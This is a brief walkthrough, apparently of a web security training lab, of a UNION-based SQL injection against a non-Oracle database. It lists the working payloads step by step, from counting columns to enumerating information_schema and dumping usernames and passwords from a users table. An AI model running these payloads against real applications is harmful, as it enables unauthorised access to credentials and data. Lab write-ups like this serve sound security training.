SQL injection attack, listing the database contents on non-Oracle databases

We start by finding the number of columns:

'+UNION+SELECT+NULL,NULL--

Then the columns with text:

'+UNION+SELECT+'asdf','asdf'--

Refering to the cheatsheet, we use the following payload to get the table names:

'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--

Now we start looking for an users table. It should look something like users_SOMETHING. 
In my case it's users_hnwjqa

Payload to retrieve details:
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_hnwjqa'--

There should be a user and a password in the page displayed. Let's use them to get all the users and passwords:

'+UNION+SELECT+username_rblgyx,+password_reluer+FROM+users_hnwjqa--
